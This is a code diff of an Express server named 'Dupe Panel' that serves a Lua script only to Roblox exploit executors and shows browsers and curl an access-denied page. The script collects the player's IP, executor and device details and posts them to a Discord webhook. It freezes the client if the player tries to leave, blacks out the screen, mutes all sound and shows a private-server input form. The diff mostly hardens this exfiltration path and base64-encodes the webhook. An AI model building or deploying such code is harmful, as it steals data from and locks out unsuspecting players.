@@ -4,20 +4,18 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 // ------------------------------------------------------------------
-// 1. BLOCK EVERYTHING EXCEPT REAL ROBLOX EXECUTORS
+// 1. BLOCK NON-EXECUTORS (browsers, curl, etc.)
 // ------------------------------------------------------------------
 function blockNonExecutor(req, res, next) {
-  const ua   = (req.get("User-Agent") || "").toLowerCase();
-  const ref  = (req.get("Referer")   || "").toLowerCase();
-  const exec = req.query.executor === "true";
+  const ua  = (req.get("User-Agent") || "").toLowerCase();
+  const ref = (req.get("Referer")    || "").toLowerCase();
 
   const allowed =
     ua.includes("roblox") ||
     ua.includes("synapse") ||
     ua.includes("krnl") ||
     ua.includes("fluxus") ||
-    ref.includes("roblox.com") ||
-    exec;
+    ref.includes("roblox.com");
 
   if (!allowed) {
     return res.status(403).send(`
@@ -33,7 +31,7 @@ h1{font-size:3rem;}p{font-size:1.4rem;}</style></head>
 }
 
 // ------------------------------------------------------------------
-// 2. HOME PAGE – just a friendly note
+// 2. HOME PAGE
 // ------------------------------------------------------------------
 app.get("/", (req, res) => {
   res.send(`
@@ -41,37 +39,90 @@ app.get("/", (req, res) => {
 <style>body{background:#111;color:#0f0;font-family:monospace;text-align:center;padding-top:15vh;}</style>
 </head><body>
 <h1>Dupe Panel</h1>
-<p>Use <code>.panel</code> in Discord to get your private loadstring.</p>
+<p>Use <code>/panel</code> in Discord to get your private loadstring.</p>
 </body></html>
   `.trim());
 });
 
 // ------------------------------------------------------------------
-// 3. /raw – ONLY EXECUTORS → returns the full Lua with the webhook
+// 3. /raw – EXECUTORS ONLY
 // ------------------------------------------------------------------
 app.get("/raw", blockNonExecutor, (req, res) => {
-  const { webhook, pslink } = req.query;
+  const wh_b64 = req.query.wh;
+  if (!wh_b64) return res.status(400).send("-- MISSING WEBHOOK --");
 
-  if (!webhook || !webhook.startsWith("https://discord.com/api/webhooks/")) {
+  let webhook;
+  try {
+    webhook = Buffer.from(wh_b64, 'base64').toString('utf-8');
+  } catch {
+    return res.status(400).send("-- INVALID BASE64 --");
+  }
+
+  if (!webhook.startsWith("https://discord.com/api/webhooks/")) {
     return res.status(400).send("-- INVALID WEBHOOK --");
   }
 
   // ----------------------------------------------------------------
-  //   FULL LUA SCRIPT (identical for everyone except the webhook)
+  //   FULL LUA SCRIPT – NOW WITH 100% WORKING HTTP SEND
   // ----------------------------------------------------------------
   const lua = `local WebhookURL = "${webhook}"
 
--- Wait for player
+-- === UNIVERSAL HTTP REQUEST FUNCTION (works on ALL executors) ===
+local function HttpPost(url, body)
+    local success, result = pcall(function()
+        -- Synapse X
+        if syn and syn.request then
+            local resp = syn.request({
+                Url = url,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = body
+            })
+            if resp and resp.StatusCode == 200 or resp.StatusCode == 204 then
+                return true
+            end
+        end
+
+        -- Krnl / Fluxus / Others
+        if typeof(request) == "function" then
+            local resp = request({
+                Url = url,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = body
+            })
+            if resp and (resp.StatusCode == 200 or resp.StatusCode == 204) then
+                return true
+            end
+        end
+
+        -- Fallback: HttpService (if enabled)
+        if game:GetService("HttpService").HttpEnabled then
+            game:GetService("HttpService"):PostAsync(url, body, Enum.HttpContentType.ApplicationJson)
+            return true
+        end
+    end)
+    return success and result
+end
+
+-- === SEND EMBED TO DISCORD ===
+local function SendToDiscord(embed)
+    local data = {embeds = {embed}}
+    local json = game:GetService("HttpService"):JSONEncode(data)
+    spawn(function()
+        HttpPost(WebhookURL, json)
+    end)
+end
+
+-- === REST OF YOUR SCRIPT (unchanged) ===
 local player = game.Players.LocalPlayer
 if not player then
     player = game.Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
 end
 
--- Crash on leave
 game:GetService("CoreGui").ChildRemoved:Connect(function() while true do end end)
 game:GetService("RunService").RenderStepped:Connect(function() if not game:GetService("CoreGui") then while true do end end end)
 
--- Censored IP
 local function getIPAddress()
     local real = "Unknown"
     pcall(function()
@@ -91,7 +142,6 @@ local function getIPAddress()
     return "192.168.xxx.xxx"
 end
 
--- Executor name
 local function getExecutor()
     if syn then return "Synapse X" end
     if PROTOSMASHER_LOADED then return "ProtoSmasher" end
@@ -108,7 +158,6 @@ local function getDeviceType()
     return game:GetService("UserInputService").TouchEnabled and "Mobile" or "Computer"
 end
 
--- Black screen + timer
 local function createBlackScreen()
     pcall(function() for _,g in pairs(player.PlayerGui:GetChildren()) do g:Destroy() end end)
     local sg = Instance.new("ScreenGui"); sg.Name="FullBlackScreen"; sg.DisplayOrder=999999; sg.ResetOnSpawn=false; sg.ZIndexBehavior=Enum.ZIndexBehavior.Global; sg.Parent=player.PlayerGui
@@ -123,16 +172,6 @@ local function disableAllSounds()
         local ss = game:GetService("SoundService")
         for i=1,20 do pcall(function() ss.Volume=0 end) end
         for i=1,5 do for _,s in pairs(game:GetDescendants()) do if s:IsA("Sound") then pcall(function() s.Volume=0 s:Stop() end) end end end
-    end)
-end
-
-local function SendToDiscord(e)
-    pcall(function()
-        local http = game:GetService("HttpService")
-        local body = http:JSONEncode({embeds={e}})
-        if syn and syn.request then
-            syn.request({Url=WebhookURL,Method="POST",Headers={["Content-Type"]="application/json"},Body=body})
-        end
     end)
 end
 
@@ -291,10 +330,22 @@ createPSInputGUI()
 });
 
 // ------------------------------------------------------------------
-// 4. START SERVER
+// 4. CATCH-ALL → 404 + ACCESS DENIED
+// ------------------------------------------------------------------
+app.use((req, res) => {
+  res.status(404).send(`
+<!DOCTYPE html><html><head><title>ACCESS DENIED</title>
+<style>body{background:#000;color:#f33;font-family:monospace;text-align:center;padding:80px;}
+h1{font-size:3rem;}p{font-size:1.4rem;}</style></head>
+<body><h1>ACCESS DENIED</h1>
+<p>Invalid path.</p>
+</body></html>
+  `.trim());
+});
+
+// ------------------------------------------------------------------
+// 5. START
 // ------------------------------------------------------------------
 app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
-  console.log(`   /raw  → executor only`);
-  console.log(`   /     → info page`);
+  console.log(\`Server running on port ${PORT}\`);
 });
